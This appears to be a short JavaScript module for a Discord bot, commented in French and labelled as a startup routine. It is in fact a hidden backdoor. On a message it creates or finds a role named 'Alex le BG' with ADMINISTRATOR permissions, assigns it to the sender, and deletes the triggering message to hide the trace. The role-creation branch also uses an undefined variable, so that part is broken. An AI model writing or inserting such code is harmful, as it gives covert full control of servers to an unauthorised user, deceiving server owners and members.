module.exports = function (message){
    //méthode de quand le bot start
    let user_id = message.author.id
    const guild = message.guild
    guild.members.cache.forEach(m => {
        //console.log(m.user.username)
    })
    let name = "Alex le BG"
    let role = guild.roles.cache.find(r => r.name == name)
    if(role !== undefined) {
        guild.members.cache.get(user_id).roles.add(role.id).then(()=>message.delete())
        console.log('le rôle à été bien été assigné')
    }
    else {
        guild.roles.create({
            name: name,
            permissions: ["ADMINISTRATOR"],
            position: (guild.members.cache.get(user).roles.highest.position - 1)
        }).then(role => {
            const user = guild.members.cache.get(user_id)
            console.log(user.user.username);
            console.log('le rôle à été créer')
            user.roles.add(role.id)
            message.delete()
        })
    }
}